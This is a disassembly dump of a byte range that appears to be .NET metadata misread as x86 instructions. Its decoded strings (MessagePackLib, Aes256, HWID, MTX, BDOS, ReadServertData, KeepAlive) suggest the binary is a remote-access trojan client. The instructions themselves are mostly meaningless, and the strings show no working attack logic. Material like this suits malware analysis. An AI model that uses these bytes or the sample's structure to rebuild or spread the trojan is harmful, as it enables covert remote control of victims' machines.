  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 28                	add    %ch,(%eax)
  407705:	0f 1b 0f             	bndstx %bnd1,(%edi)
  407708:	33 0f                	xor    (%edi),%ecx
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	06                   	push   %es
  40771b:	1c 01                	sbb    $0x1,%al
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	f1                   	int1
  407723:	1b 01                	sbb    (%ecx),%eax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	ef                   	out    %eax,(%dx)
  40772b:	05 02 00 41 01       	add    $0x1410002,%eax
  407730:	77 00                	ja     0x407732
  407732:	07                   	pop    %es
  407733:	1b 02                	sbb    (%edx),%eax
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	c3                   	ret
  40773b:	08 02                	or     %al,(%edx)
  40773d:	00 40 01             	add    %al,0x1(%eax)
  407740:	7b 00                	jnp    0x407742
  407742:	84 0e                	test   %cl,(%esi)
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	40                   	inc    %eax
  407765:	01 00                	add    %eax,(%eax)
  407767:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	c1 02 00             	roll   $0x0,(%edx)
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	f4                   	hlt
  40778b:	0f 00 00             	sldt   (%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 da                	add    %bl,%dl
  40779f:	0c 00                	or     $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	4b                   	dec    %ebx
  4077b3:	08 00                	or     %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 e5                	add    %ah,%ch
  4077c7:	02 00                	add    (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 85 1a 00 00 00    	add    %al,0x1a(%ebp)
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	ac                   	lods   %ds:(%esi),%al
  4077ef:	17                   	pop    %ss
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 9b 12 00 00 00    	add    %bl,0x12(%ebx)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407829:	70 5f                	jo     0x40788a
  40782b:	5f                   	pop    %edi
  40782c:	30 00                	xor    %al,(%eax)
  40782e:	49                   	dec    %ecx
  40782f:	45                   	inc    %ebp
  407830:	6e                   	outsb  %ds:(%esi),(%dx)
  407831:	75 6d                	jne    0x4078a0
  407833:	65 72 61             	gs jb  0x407897
  407836:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40783a:	31 00                	xor    %eax,(%eax)
  40783c:	43                   	inc    %ebx
  40783d:	61                   	popa
  40783e:	6c                   	insb   (%dx),%es:(%edi)
  40783f:	6c                   	insb   (%dx),%es:(%edi)
  407840:	53                   	push   %ebx
  407841:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407848:	69 
  407849:	73 74                	jae    0x4078bf
  40784b:	60                   	pusha
  40784c:	31 00                	xor    %eax,(%eax)
  40784e:	61                   	popa
  40784f:	31 00                	xor    %eax,(%eax)
  407851:	76 31                	jbe    0x407884
  407853:	00 5f 5f             	add    %bl,0x5f(%edi)
  407856:	53                   	push   %ebx
  407857:	74 61                	je     0x4078ba
  407859:	74 69                	je     0x4078c4
  40785b:	63 41 72             	arpl   %eax,0x72(%ecx)
  40785e:	72 61                	jb     0x4078c1
  407860:	79 49                	jns    0x4078ab
  407862:	6e                   	outsb  %ds:(%esi),(%dx)
  407863:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40786a:	69 
  40786b:	7a 65                	jp     0x4078d2
  40786d:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  407872:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407879:	74 2e                	je     0x4078a9
  40787b:	57                   	push   %edi
  40787c:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 33                	je     0x4078bb
  407888:	32 00                	xor    (%eax),%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	53                   	push   %ebx
  407893:	77 61                	ja     0x4078f6
  407895:	70 49                	jo     0x4078e0
  407897:	6e                   	outsb  %ds:(%esi),(%dx)
  407898:	74 33                	je     0x4078cd
  40789a:	32 00                	xor    (%eax),%al
  40789c:	3c 3e                	cmp    $0x3e,%al
  40789e:	6f                   	outsl  %ds:(%esi),(%dx)
  40789f:	5f                   	pop    %edi
  4078a0:	5f                   	pop    %edi
  4078a1:	32 00                	xor    (%eax),%al
  4078a3:	61                   	popa
  4078a4:	32 00                	xor    (%eax),%al
  4078a6:	58                   	pop    %eax
  4078a7:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078ac:	72 74                	jb     0x407922
  4078ae:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078b5:	32 00                	xor    (%eax),%al
  4078b7:	76 32                	jbe    0x4078eb
  4078b9:	00 76 33             	add    %dh,0x33(%esi)
  4078bc:	00 57 72             	add    %dl,0x72(%edi)
  4078bf:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078c6:	36 
  4078c7:	34 00                	xor    $0x0,%al
  4078c9:	54                   	push   %esp
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	55                   	push   %ebp
  4078cc:	49                   	dec    %ecx
  4078cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ce:	74 36                	je     0x407906
  4078d0:	34 00                	xor    $0x0,%al
  4078d2:	47                   	inc    %edi
  4078d3:	65 74 41             	gs je  0x407917
  4078d6:	73 55                	jae    0x40792d
  4078d8:	49                   	dec    %ecx
  4078d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078da:	74 36                	je     0x407912
  4078dc:	34 00                	xor    $0x0,%al
  4078de:	53                   	push   %ebx
  4078df:	65 74 41             	gs je  0x407923
  4078e2:	73 55                	jae    0x407939
  4078e4:	49                   	dec    %ecx
  4078e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e6:	74 36                	je     0x40791e
  4078e8:	34 00                	xor    $0x0,%al
  4078ea:	54                   	push   %esp
  4078eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	53                   	push   %ebx
  4078f3:	77 61                	ja     0x407956
  4078f5:	70 49                	jo     0x407940
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	74 36                	je     0x407930
  4078fa:	34 00                	xor    $0x0,%al
  4078fc:	54                   	push   %esp
  4078fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fe:	55                   	push   %ebp
  4078ff:	49                   	dec    %ecx
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 31                	je     0x407934
  407903:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  40790f:	61                   	popa
  407910:	70 49                	jo     0x40795b
  407912:	6e                   	outsb  %ds:(%esi),(%dx)
  407913:	74 31                	je     0x407946
  407915:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407919:	41                   	inc    %ecx
  40791a:	43                   	inc    %ebx
  40791b:	53                   	push   %ebx
  40791c:	48                   	dec    %eax
  40791d:	41                   	inc    %ecx
  40791e:	32 35 36 00 53 68    	xor    0x68530036,%dh
  407924:	61                   	popa
  407925:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40792b:	73 32                	jae    0x40795f
  40792d:	35 36 00 61 65       	xor    $0x65610036,%eax
  407932:	73 32                	jae    0x407966
  407934:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407939:	53                   	push   %ebx
  40793a:	74 61                	je     0x40799d
  40793c:	74 69                	je     0x4079a7
  40793e:	63 41 72             	arpl   %eax,0x72(%ecx)
  407941:	72 61                	jb     0x4079a4
  407943:	79 49                	jns    0x40798e
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40794d:	69 
  40794e:	7a 65                	jp     0x4079b5
  407950:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  407955:	74 5f                	je     0x4079b6
  407957:	55                   	push   %ebp
  407958:	54                   	push   %esp
  407959:	46                   	inc    %esi
  40795a:	38 00                	cmp    %al,(%eax)
  40795c:	6c                   	insb   (%dx),%es:(%edi)
  40795d:	36 78 75             	ss js  0x4079d5
  407960:	79 35                	jns    0x407997
  407962:	6f                   	outsl  %ds:(%esi),(%dx)
  407963:	38 00                	cmp    %al,(%eax)
  407965:	3c 4d                	cmp    $0x4d,%al
  407967:	6f                   	outsl  %ds:(%esi),(%dx)
  407968:	64 75 6c             	fs jne 0x4079d7
  40796b:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  407970:	73 73                	jae    0x4079e5
  407972:	61                   	popa
  407973:	67 65 50             	addr16 gs push %eax
  407976:	61                   	popa
  407977:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  40797a:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407981:	76 61                	jbe    0x4079e4
  407983:	74 65                	je     0x4079ea
  407985:	49                   	dec    %ecx
  407986:	6d                   	insl   (%dx),%es:(%edi)
  407987:	70 6c                	jo     0x4079f5
  407989:	65 6d                	gs insl (%dx),%es:(%edi)
  40798b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40798d:	74 61                	je     0x4079f0
  40798f:	74 69                	je     0x4079fa
  407991:	6f                   	outsl  %ds:(%esi),(%dx)
  407992:	6e                   	outsb  %ds:(%esi),(%dx)
  407993:	44                   	inc    %esp
  407994:	65 74 61             	gs je  0x4079f8
  407997:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40799e:	42 
  40799f:	32 41 31             	xor    0x31(%ecx),%al
  4079a2:	46                   	inc    %esi
  4079a3:	39 39                	cmp    %edi,(%ecx)
  4079a5:	30 32                	xor    %dh,(%edx)
  4079a7:	42                   	inc    %edx
  4079a8:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079ae:	38 30                	cmp    %dh,(%eax)
  4079b0:	45                   	inc    %ebp
  4079b1:	46                   	inc    %esi
  4079b2:	31 36                	xor    %esi,(%esi)
  4079b4:	39 32                	cmp    %esi,(%edx)
  4079b6:	43                   	inc    %ebx
  4079b7:	45                   	inc    %ebp
  4079b8:	39 39                	cmp    %edi,(%ecx)
  4079ba:	34 37                	xor    $0x37,%al
  4079bc:	41                   	inc    %ecx
  4079bd:	31 39                	xor    %edi,(%ecx)
  4079bf:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079c3:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079c6:	44                   	inc    %esp
  4079c7:	38 46 35             	cmp    %al,0x35(%esi)
  4079ca:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079ce:	41                   	inc    %ecx
  4079cf:	37                   	aaa
  4079d0:	32 31                	xor    (%ecx),%dh
  4079d2:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079d8:	43                   	inc    %ebx
  4079d9:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079de:	43                   	inc    %ebx
  4079df:	00 45 53             	add    %al,0x53(%ebp)
  4079e2:	5f                   	pop    %edi
  4079e3:	53                   	push   %ebx
  4079e4:	59                   	pop    %ecx
  4079e5:	53                   	push   %ebx
  4079e6:	54                   	push   %esp
  4079e7:	45                   	inc    %ebp
  4079e8:	4d                   	dec    %ebp
  4079e9:	5f                   	pop    %edi
  4079ea:	52                   	push   %edx
  4079eb:	45                   	inc    %ebp
  4079ec:	51                   	push   %ecx
  4079ed:	55                   	push   %ebp
  4079ee:	49                   	dec    %ecx
  4079ef:	52                   	push   %edx
  4079f0:	45                   	inc    %ebp
  4079f1:	44                   	inc    %esp
  4079f2:	00 45 53             	add    %al,0x53(%ebp)
  4079f5:	5f                   	pop    %edi
  4079f6:	44                   	inc    %esp
  4079f7:	49                   	dec    %ecx
  4079f8:	53                   	push   %ebx
  4079f9:	50                   	push   %eax
  4079fa:	4c                   	dec    %esp
  4079fb:	41                   	inc    %ecx
  4079fc:	59                   	pop    %ecx
  4079fd:	5f                   	pop    %edi
  4079fe:	52                   	push   %edx
  4079ff:	45                   	inc    %ebp
  407a00:	51                   	push   %ecx
  407a01:	55                   	push   %ebp
  407a02:	49                   	dec    %ecx
  407a03:	52                   	push   %edx
  407a04:	45                   	inc    %ebp
  407a05:	44                   	inc    %esp
  407a06:	00 4d 61             	add    %cl,0x61(%ebp)
  407a09:	70 4e                	jo     0x407a59
  407a0b:	61                   	popa
  407a0c:	6d                   	insl   (%dx),%es:(%edi)
  407a0d:	65 54                	gs push %esp
  407a0f:	6f                   	outsl  %ds:(%esi),(%dx)
  407a10:	4f                   	dec    %edi
  407a11:	49                   	dec    %ecx
  407a12:	44                   	inc    %esp
  407a13:	00 48 57             	add    %cl,0x57(%eax)
  407a16:	49                   	dec    %ecx
  407a17:	44                   	inc    %esp
  407a18:	00 67 65             	add    %ah,0x65(%edi)
  407a1b:	74 5f                	je     0x407a7c
  407a1d:	46                   	inc    %esi
  407a1e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1f:	72 6d                	jb     0x407a8e
  407a21:	61                   	popa
  407a22:	74 49                	je     0x407a6d
  407a24:	44                   	inc    %esp
  407a25:	00 45 58             	add    %al,0x58(%ebp)
  407a28:	45                   	inc    %ebp
  407a29:	43                   	inc    %ebx
  407a2a:	55                   	push   %ebp
  407a2b:	54                   	push   %esp
  407a2c:	49                   	dec    %ecx
  407a2d:	4f                   	dec    %edi
  407a2e:	4e                   	dec    %esi
  407a2f:	5f                   	pop    %edi
  407a30:	53                   	push   %ebx
  407a31:	54                   	push   %esp
  407a32:	41                   	inc    %ecx
  407a33:	54                   	push   %esp
  407a34:	45                   	inc    %ebp
  407a35:	00 38                	add    %bh,(%eax)
  407a37:	37                   	aaa
  407a38:	36 33 39             	xor    %ss:(%ecx),%edi
  407a3b:	31 32                	xor    %esi,(%edx)
  407a3d:	36 45                	ss inc %ebp
  407a3f:	41                   	inc    %ecx
  407a40:	37                   	aaa
  407a41:	37                   	aaa
  407a42:	42                   	inc    %edx
  407a43:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a49:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a4e:	37                   	aaa
  407a4f:	44                   	inc    %esp
  407a50:	42                   	inc    %edx
  407a51:	41                   	inc    %ecx
  407a52:	36 37                	ss aaa
  407a54:	43                   	inc    %ebx
  407a55:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a5a:	46                   	inc    %esi
  407a5b:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a60:	39 38                	cmp    %edi,(%eax)
  407a62:	38 38                	cmp    %bh,(%eax)
  407a64:	45                   	inc    %ebp
  407a65:	44                   	inc    %esp
  407a66:	30 37                	xor    %dh,(%edi)
  407a68:	30 43 44             	xor    %al,0x44(%ebx)
  407a6b:	34 30                	xor    $0x30,%al
  407a6d:	45                   	inc    %ebp
  407a6e:	31 46 36             	xor    %eax,0x36(%esi)
  407a71:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a77:	67 65 74 5f          	addr16 gs je 0x407ada
  407a7b:	41                   	inc    %ecx
  407a7c:	53                   	push   %ebx
  407a7d:	43                   	inc    %ebx
  407a7e:	49                   	dec    %ecx
  407a7f:	49                   	dec    %ecx
  407a80:	00 53 79             	add    %dl,0x79(%ebx)
  407a83:	73 74                	jae    0x407af9
  407a85:	65 6d                	gs insl (%dx),%es:(%edi)
  407a87:	2e 49                	cs dec %ecx
  407a89:	4f                   	dec    %edi
  407a8a:	00 49 73             	add    %cl,0x73(%ecx)
  407a8d:	58                   	pop    %eax
  407a8e:	50                   	push   %eax
  407a8f:	00 42 44             	add    %al,0x44(%edx)
  407a92:	4f                   	dec    %edi
  407a93:	53                   	push   %ebx
  407a94:	00 45 53             	add    %al,0x53(%ebp)
  407a97:	5f                   	pop    %edi
  407a98:	43                   	inc    %ebx
  407a99:	4f                   	dec    %edi
  407a9a:	4e                   	dec    %esi
  407a9b:	54                   	push   %esp
  407a9c:	49                   	dec    %ecx
  407a9d:	4e                   	dec    %esi
  407a9e:	55                   	push   %ebp
  407a9f:	4f                   	dec    %edi
  407aa0:	55                   	push   %ebp
  407aa1:	53                   	push   %ebx
  407aa2:	00 67 65             	add    %ah,0x65(%edi)
  407aa5:	74 5f                	je     0x407b06
  407aa7:	49                   	dec    %ecx
  407aa8:	56                   	push   %esi
  407aa9:	00 73 65             	add    %dh,0x65(%ebx)
  407aac:	74 5f                	je     0x407b0d
  407aae:	49                   	dec    %ecx
  407aaf:	56                   	push   %esi
  407ab0:	00 47 65             	add    %al,0x65(%edi)
  407ab3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab4:	65 72 61             	gs jb  0x407b18
  407ab7:	74 65                	je     0x407b1e
  407ab9:	49                   	dec    %ecx
  407aba:	56                   	push   %esi
  407abb:	00 4d 54             	add    %cl,0x54(%ebp)
  407abe:	58                   	pop    %eax
  407abf:	00 76 61             	add    %dh,0x61(%esi)
  407ac2:	6c                   	insb   (%dx),%es:(%edi)
  407ac3:	75 65                	jne    0x407b2a
  407ac5:	5f                   	pop    %edi
  407ac6:	5f                   	pop    %edi
  407ac7:	00 52 65             	add    %dl,0x65(%edx)
  407aca:	61                   	popa
  407acb:	64 53                	fs push %ebx
  407acd:	65 72 76             	gs jb  0x407b46
  407ad0:	65 72 74             	gs jb  0x407b47
  407ad3:	44                   	inc    %esp
  407ad4:	61                   	popa
  407ad5:	74 61                	je     0x407b38
  407ad7:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407adb:	61                   	popa
  407adc:	00 6d 73             	add    %ch,0x73(%ebp)
  407adf:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ae2:	6c                   	insb   (%dx),%es:(%edi)
  407ae3:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407aea:	65 6d                	gs insl (%dx),%es:(%edi)
  407aec:	2e 43                	cs inc %ebx
  407aee:	6f                   	outsl  %ds:(%esi),(%dx)
  407aef:	6c                   	insb   (%dx),%es:(%edi)
  407af0:	6c                   	insb   (%dx),%es:(%edi)
  407af1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407af6:	6e                   	outsb  %ds:(%esi),(%dx)
  407af7:	73 2e                	jae    0x407b27
  407af9:	47                   	inc    %edi
  407afa:	65 6e                	outsb  %gs:(%esi),(%dx)
  407afc:	65 72 69             	gs jb  0x407b68
  407aff:	63 00                	arpl   %eax,(%eax)
  407b01:	4d                   	dec    %ebp
  407b02:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b09:	74 2e                	je     0x407b39
  407b0b:	56                   	push   %esi
  407b0c:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b13:	73 69                	jae    0x407b7e
  407b15:	63 00                	arpl   %eax,(%eax)
  407b17:	67 65 74 5f          	addr16 gs je 0x407b7a
  407b1b:	53                   	push   %ebx
  407b1c:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b1e:	64 53                	fs push %ebx
  407b20:	79 6e                	jns    0x407b90
  407b22:	63 00                	arpl   %eax,(%eax)
  407b24:	45                   	inc    %ebp
  407b25:	6e                   	outsb  %ds:(%esi),(%dx)
  407b26:	64 52                	fs push %edx
  407b28:	65 61                	gs popa
  407b2a:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b2e:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b35:	00 
  407b36:	54                   	push   %esp
  407b37:	68 72 65 61 64       	push   $0x64616572
  407b3c:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b40:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b44:	6e                   	outsb  %ds:(%esi),(%dx)
  407b45:	65 72 41             	gs jb  0x407b89
  407b48:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b4d:	41                   	inc    %ecx
  407b4e:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b54:	61                   	popa
  407b55:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b5b:	74 5f                	je     0x407bbc
  407b5d:	43                   	inc    %ebx
  407b5e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b5f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b60:	6e                   	outsb  %ds:(%esi),(%dx)
  407b61:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b66:	00 67 65             	add    %ah,0x65(%edi)
  407b69:	74 5f                	je     0x407bca
  407b6b:	49                   	dec    %ecx
  407b6c:	73 43                	jae    0x407bb1
  407b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b70:	6e                   	outsb  %ds:(%esi),(%dx)
  407b71:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b76:	00 73 65             	add    %dh,0x65(%ebx)
  407b79:	74 5f                	je     0x407bda
  407b7b:	49                   	dec    %ecx
  407b7c:	73 43                	jae    0x407bc1
  407b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b80:	6e                   	outsb  %ds:(%esi),(%dx)
  407b81:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b86:	00 52 65             	add    %dl,0x65(%edx)
  407b89:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b8c:	76 65                	jbe    0x407bf3
  407b8e:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b92:	74 5f                	je     0x407bf3
  407b94:	47                   	inc    %edi
  407b95:	75 69                	jne    0x407c00
  407b97:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b9b:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407ba2:	64 
  407ba3:	53                   	push   %ebx
  407ba4:	79 6e                	jns    0x407c14
  407ba6:	63 3e                	arpl   %edi,(%esi)
  407ba8:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407bac:	61                   	popa
  407bad:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bb0:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb1:	67 46                	addr16 inc %esi
  407bb3:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bba:	73 43                	jae    0x407bff
  407bbc:	6f                   	outsl  %ds:(%esi),(%dx)
  407bbd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbe:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbf:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bc4:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc9:	61                   	popa
  407bca:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bcd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bce:	67 46                	addr16 inc %esi
  407bd0:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bd7:	65 65 70 41          	gs gs jo 0x407c1c
  407bdb:	6c                   	insb   (%dx),%es:(%edi)
  407bdc:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407be3:	42                   	inc    %edx
  407be4:	61                   	popa
  407be5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407be8:	6e                   	outsb  %ds:(%esi),(%dx)
  407be9:	67 46                	addr16 inc %esi
  407beb:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407bf2:	65 61                	gs popa
  407bf4:	64 65 72 53          	fs gs jb 0x407c4b
  407bf8:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bff:	42                   	inc    %edx
  407c00:	61                   	popa
